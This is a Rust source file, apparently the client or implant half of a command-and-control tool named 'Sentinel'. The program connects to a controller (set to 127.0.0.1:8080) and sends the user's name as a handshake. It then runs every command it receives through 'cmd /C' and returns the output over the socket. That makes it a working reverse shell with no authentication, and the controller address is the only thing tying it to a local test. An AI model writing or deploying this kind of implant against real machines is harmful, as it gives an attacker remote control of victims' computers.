use common::SentinelPacket;
use tokio::net::TcpStream;
use tokio::io::{AsyncWriteExt,AsyncReadExt};
use tokio::task;
use std::process::Command;
#[tokio::main]
async fn main() -> std::io::Result<()> {
    let address = "127.0.0.1:8080".to_string();
    let name = whoami::username();
    let _packet = SentinelPacket::Handshake {
        hostname: name,
        version: env!("CARGO_PKG_VERSION").to_string(),
    };
    //Translate complex Rust data to a byte stream that can be sent over the network
    let bytes = bincode::serialize(&_packet).unwrap();
    let mut stream = TcpStream::connect(address).await?;
    stream.write_all(&bytes).await?;

    let mut buf = vec![0u8; 8 * 1024];

    loop {
        let n = match stream.read(&mut buf).await {
            Ok(0) => break, // Connection closed
            Ok(n) => n,
            Err(e) => {
                eprintln!("Failed to read from stream: {}", e);
                break;
            }
        };

        if let Ok(packet) = bincode::deserialize::<SentinelPacket>(&buf[..n]) {
            match packet {
                SentinelPacket::Command(cmd_str) => {
                    // 1. Run the command in a background thread to keep the app responsive
                    let output = task::spawn_blocking(move || {
                        Command::new("cmd")
                            .args(&["/C", &cmd_str])
                            .output()
                    }).await;

                    // 2. Determine the result and wrap it in our Enum
                    let reply_packet = match output {
                        Ok(Ok(out)) => {
                            let stdout = String::from_utf8_lossy(&out.stdout).into_owned();
                            let stderr = String::from_utf8_lossy(&out.stderr).into_owned();

                            if out.status.success() {
                                SentinelPacket::Success(stdout)
                            } else {
                                // If the command ran but returned an error (like 'file not found')
                                SentinelPacket::Error(if stderr.is_empty() { stdout } else { stderr })
                            }
                        }
                        _ => SentinelPacket::Error("Failed to execute or capture command".to_string()),
                    };

                    // 3. Serialize the ENUM (this is what the Controller expects)
                    let reply_bytes = bincode::serialize(&reply_packet).unwrap();

                    // 4. SEND the bytes back to the Controller
                    if let Err(e) = stream.write_all(&reply_bytes).await {
                        eprintln!("Write error: {}", e);
                        break;
                    }
                }
                _ => {
                    eprintln!("Received unexpected packet type from Controller");
                }
            }
        }
    }

    Ok(())
}
